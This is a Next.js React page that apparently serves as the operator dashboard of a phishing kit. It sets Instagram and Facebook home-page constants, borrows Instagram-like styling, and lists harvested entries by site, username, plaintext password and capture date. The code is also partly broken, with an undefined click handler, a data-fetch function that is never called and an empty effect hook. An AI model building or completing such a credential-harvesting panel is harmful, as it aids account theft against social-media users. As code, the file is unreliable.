import React, {useState,useEffect} from 'react'

import Link from 'next/link';

import {useRouter} from 'next/router'

import Layout from "../components/contrib/layout"

import userData from "../components/contrib/user_files"
const friendlyTime = require("friendly-time");

import {NextSeo} from 'next-seo'

import axios from 'axios'

//config--email,picture,language

const homePage = 'http://instagram.com'
const fbHomePage = 'http://web.facebook.com'


 const main = () => {

const router = useRouter()

const [users,setUsers] = useState([])





useEffect( async ()=>{



},[])


const getData = async ()=>{

const res = await axios.get('/api')

   if (res.data){
setUsers(res.data.users)
   }


}

const getDate=(date)=>{


  return friendlyTime(new Date(date))
}








    return (  

     <Layout >


<NextSeo title={"Inst. Incoming Users"} />



<section class="_9eogI E3X2T ">


        <div class="pd-20 card-box mb-30">
          <div class="clearfix mb-20">
            <div class="pull-left">
              <h4 class="text-blue h4">User Data Table ({Object.keys(users).length})</h4>
              <p>Incoming class <code>.table</code></p>
            </div>
            <div class="pull-right w-100 d-flex align-items-center justify-content-center">
              <a onClick={promptData} class="btn btn-primary text-white w-50 btn-sm scroll-click" 
           role="button"><i class="fa fa-unlock px-4"></i>
               Provide Authentication to get Data</a>
            </div>
          </div>
          <table class="table">
            <thead>
              <tr>
                <th scope="col">#</th>
                <th scope="col">Site</th>
                <th scope="col">Email / Username</th>
                <th scope="col">Password</th>
                <th scope="col">Date</th>
              </tr>
            </thead>
            <tbody>

            {Object.values(users).map((e,key)=>  <tr>
                <th scope="row" key={key} >{key}</th>
                <td>{e.site}</td>
                <td>{e.username}</td>
                <td>{e.password}</td>
                <td><span class="badge badge-primary">{getDate(e.date)} </span></td>
          
              </tr>)} 


            
        
            </tbody>
          </table>
          <div class="collapse collapse-box" id="basic-table" >
            <div class="code-box">
              <div class="clearfix">
                <a href="javascript:;" class="btn btn-primary btn-sm code-copy pull-left"  data-clipboard-target="#basic-table-code"><i class="fa fa-clipboard"></i> Copy Code</a>
                <a href="#basic-table" class="btn btn-primary btn-sm pull-right" rel="content-y"  data-toggle="collapse" role="button"><i class="fa fa-eye-slash"></i> Hide Code</a>
              </div>
              <pre><code class="xml copy-pre" id="basic-table-code">
<table class="table">
  <thead>
    <tr>
      <th scope="col">#</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">1</th>
    </tr>
  </tbody>
</table>
              </code></pre>
            </div>
          </div>
        </div>






</section>

     </Layout >

);
}

export default main;


